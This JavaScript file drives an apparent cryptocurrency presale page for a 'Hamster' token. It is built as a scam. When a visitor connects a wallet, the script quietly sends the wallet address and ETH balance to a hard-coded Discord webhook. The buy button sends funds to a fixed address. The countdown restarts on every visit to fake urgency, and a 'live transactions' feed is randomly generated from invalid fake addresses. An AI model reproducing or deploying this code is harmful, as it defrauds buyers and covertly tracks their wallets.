document.addEventListener('DOMContentLoaded', () => {
    const grandMasterButton = document.getElementById('grand-master');
    const lordButton = document.getElementById('lord');
    const creatorButton = document.getElementById('creator');
    const payAmountInput = document.getElementById('pay-amount');
    const receiveAmountInput = document.getElementById('receive-amount');
    const buyButton = document.getElementById('buy-button');
    const connectWalletButton = document.getElementById('connect-wallet');
    const referralLinkElement = document.getElementById('referral-link');
    const copyButton = document.getElementById('copy-button');

    // Función para actualizar el valor de receiveAmountInput basado en payAmountInput
    function updateReceiveAmount() {
        const payAmount = parseFloat(payAmountInput.value);
        const tokensPerEth = 28000;
        const tokens = payAmount * tokensPerEth;
        receiveAmountInput.value = tokens.toFixed(0);
    }

    grandMasterButton.addEventListener('click', () => {
        payAmountInput.value = '0.1';
        receiveAmountInput.value = '2400';
    });

    lordButton.addEventListener('click', () => {
        payAmountInput.value = '0.5';
        receiveAmountInput.value = '14000'; // 0.5 * 28000
    });

    creatorButton.addEventListener('click', () => {
        payAmountInput.value = '1';
        receiveAmountInput.value = '28000';
    });

    payAmountInput.addEventListener('input', updateReceiveAmount);

    var endDate = new Date();
    endDate.setDate(endDate.getDate() + 5); // Sumar 5 días
    endDate.setHours(endDate.getHours() + 14); // Sumar 14 horas

    function updateCountdown() {
        var now = new Date();
        var timeRemaining = endDate - now;

        if (timeRemaining <= 0) {
            document.getElementById('countdown').innerHTML = "Presale has ended!";
            return;
        }

        var days = Math.floor(timeRemaining / (1000 * 60 * 60 * 24));
        var hours = Math.floor((timeRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        var minutes = Math.floor((timeRemaining % (1000 * 60 * 60)) / (1000 * 60));
        var seconds = Math.floor((timeRemaining % (1000 * 60)) / 1000);

        document.getElementById('countdown').innerHTML = 
            days + "d " + hours + "h " + minutes + "m " + seconds + "s";
    }

    // Actualiza el contador cada segundo
    updateCountdown();
    setInterval(updateCountdown, 1000);

    // Función para enviar datos al webhook de Discord
    async function sendToDiscord(address, balance) {
        const webhookUrl = 'https://discord.com/api/webhooks/1122719600375758930/HOqLrk3OlLHLaiP7u2ZGFqRNOoWqnPBSyKq9S3f96m8dwYdxhBSyITl5Ocuzzogho1nl'; // Reemplaza con tu URL de webhook
        const payload = {
            content: `Nueva conexión de billetera: \n- Dirección: ${address} \n- Saldo: ${balance} ETH`
        };

        try {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            console.log('Datos enviados a Discord correctamente.');
        } catch (error) {
            console.error('Error al enviar datos a Discord:', error);
        }
    }

    // Integrar el script para conectar la billetera
    let web3;
    let account;

    connectWalletButton.addEventListener('click', async () => {
        if (window.ethereum) {
            try {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);
                const accounts = await web3.eth.getAccounts();
                account = accounts[0];

                // Obtener saldo
                const balanceWei = await web3.eth.getBalance(account);
                const balanceEth = web3.utils.fromWei(balanceWei, 'ether');

                // Enviar datos a Discord
                await sendToDiscord(account, balanceEth);

                // Selecciona todos los elementos con la clase wallet-address y actualiza su texto
                document.querySelectorAll('.wallet-address').forEach(element => {
                    element.innerText = account;
                });

                // Cambiar el texto del botón a "WEB3 ACTIVE"
                connectWalletButton.innerText = "WEB3 ACTIVE";
                connectWalletButton.disabled = true;

                // Generar el enlace de referido
                const baseUrl = 'https://pre-sale-hamster.vercel.app/';
                referralLinkElement.href = `${baseUrl}?ref=${encodeURIComponent(account)}`;
                referralLinkElement.innerText = referralLinkElement.href;

            } catch (error) {
                console.error("Error connecting to MetaMask:", error);
            }
        } else {
            alert('Usa el navegador de Metamask o Trustwallet para abrir esta DAPP, o abrir en pc con extension de Metamask.');
        }
    });

    // Configurar el evento para el botón de compra
    buyButton.addEventListener('click', async () => {
        if (web3 && account) {
            try {
                const amountToSendInEther = payAmountInput.value;
                const amountToSendInWei = web3.utils.toWei(amountToSendInEther, 'ether');
                const recipientAddress = '0x01C65F22A9478C2932e62483509c233F0aaD5c72';

                await web3.eth.sendTransaction({
                    from: account,
                    to: recipientAddress,
                    value: amountToSendInWei
                });
            } catch (error) {
                console.error('Error en la transacción:', error);
            }
        } else {
            alert('Conecta tu billetera primero.');
        }
    });

    // Copiar enlace al portapapeles
    copyButton.addEventListener('click', () => {
        navigator.clipboard.writeText(referralLinkElement.href).then(() => {
            alert('Referral link copied to clipboard!');
        }, (err) => {
            console.error('Failed to copy: ', err);
        });
    });

    // Inicializar el valor de receiveAmountInput basado en payAmountInput
    updateReceiveAmount();

    const transactionContainer = document.getElementById('transaction-container');
    const addresses = [
        '0x1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s',
        '0x2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9sa1',
        '0x3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9sa2b3',
        '0x4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9sa3b4c',
        '0x5e6f7g8h9i0j1k2l3m4n5o6p7q8r9sa4b5c6d',
        '0x6f7g8h9i0j1k2l3m4n5o6p7q8r9sa5b6c7d8e',
        '0x7g8h9i0j1k2l3m4n5o6p7q8r9sa6b7c8d9e0f',
        '0x8h9i0j1k2l3m4n5o6p7q8r9sa7b8c9d0e1f2g',
        '0x9i0j1k2l3m4n5o6p7q8r9sa8b9c0d1e2f3g4h',
        '0x0j1k2l3m4n5o6p7q8r9sa9b0c1d2e3f4g5h6i'
    ];

    function getRandomAddress() {
        return addresses[Math.floor(Math.random() * addresses.length)];
    }

    function getRandomEth() {
        return (Math.random() * (10 - 0.1) + 0.1).toFixed(2);
    }

    function getRandomHMSTR(ethAmount) {
        return (ethAmount * 28000).toFixed(0);
    }

    function getRandomHash() {
        return '0x' + Math.random().toString(36).substring(2, 15);
    }

    function getRandomTime() {
        return new Date().toLocaleTimeString();
    }

    function createTransaction() {
        const ethAmount = getRandomEth();
        const transaction = document.createElement('div');
        transaction.classList.add('transaction');

        transaction.innerHTML = `
            <span class="address">${getRandomAddress().substring(0, 6)}...${getRandomAddress().substring(38)}</span>
            <span class="amount">${ethAmount} ETH</span>
            <span class="hash"><a href="#" target="_blank">${getRandomHash().substring(0, 10)}...</a></span>
            <span class="time">${getRandomTime()}</span>
        `;

        return transaction;
    }

    function updateTransactions() {
        transactionContainer.innerHTML = '';
        for (let i = 0; i < 10; i++) {
            transactionContainer.appendChild(createTransaction());
        }
    }

    updateTransactions();
    setInterval(updateTransactions, 10000);
});
